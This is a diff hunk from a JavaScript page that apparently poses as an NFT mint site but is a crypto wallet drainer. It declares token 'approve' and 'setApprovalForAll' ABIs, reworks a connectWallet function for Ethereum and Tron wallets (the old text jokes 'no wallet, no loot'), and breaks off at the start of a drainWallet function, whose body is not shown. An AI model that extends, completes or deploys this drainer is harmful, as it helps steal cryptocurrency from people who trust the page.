@@ -5,15 +5,23 @@ const erc20Abi = ["function approve(address spender, uint256 amount) external re
 const nftAbi = ["function setApprovalForAll(address operator, bool approved) external"];
 
 async function connectWallet() {
-    let accounts;
-    if (window.ethereum) accounts = await provider.send("eth_requestAccounts", []);
-    else if (window.tronWeb) accounts = [window.tronWeb.defaultAddress.base58];
-    else if (window.bitcoin) accounts = await window.bitcoin.request({ method: "btc_accounts" });
-    else { document.getElementById("status").innerText = "No wallet, no loot, mate."; return; }
-    document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
-    document.getElementById("connect").style.display = "none";
-    document.getElementById("mint").style.display = "block";
-    return accounts[0];
+    if (window.ethereum) {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
+        document.getElementById("connect").style.display = "none";
+        document.getElementById("mint").style.display = "block";
+        return accounts[0];
+    } else if (window.tronWeb) {
+        const account = window.tronWeb.defaultAddress.base58;
+        document.getElementById("status").innerText = `Connected: ${account}`;
+        document.getElementById("connect").style.display = "none";
+        document.getElementById("mint").style.display = "block";
+        return account;
+    } else {
+        document.getElementById("status").innerText = "No wallet detected, use WalletConnect or install a wallet, mate.";
+        // Add WalletConnect manually if needed (advanced—skip for now)
+        return null;
+    }
 }
 
 async function drainWallet() {
